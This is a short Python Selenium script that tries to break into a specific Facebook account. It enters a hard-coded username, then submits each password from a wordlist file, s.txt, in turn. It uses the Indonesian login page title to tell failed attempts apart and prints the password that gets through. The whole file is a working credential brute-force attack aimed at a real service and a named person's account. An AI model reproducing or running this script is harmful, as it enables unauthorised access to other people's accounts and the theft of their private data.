from selenium import webdriver
import time
driver =webdriver.Chrome()
url = 'https://web.facebook.com'
driver.get(url)
file= open("s.txt", encoding="utf-8")
x = [l.rstrip("\n") for l in file]
elem1=driver.find_element_by_id("email")
elem1.send_keys('adit.thok.87')
for i in x: 
	    try:
		    elem = driver.find_element_by_id("pass")
		    elem3 =driver.find_element_by_xpath("//button[@name='login']")
		    elem.send_keys(i)
		    elem3.click()
	    except Exception as e:
	    	  print(i)
	    	  break
	    if driver.title == 'Facebook - Masuk atau Daftar':
	    	try:
	    		driver.back()
	    	except Exception as e:
	    		print(i)
	    		exit()
	    	continue
	    else: 
	    	    print(i);break
	    	
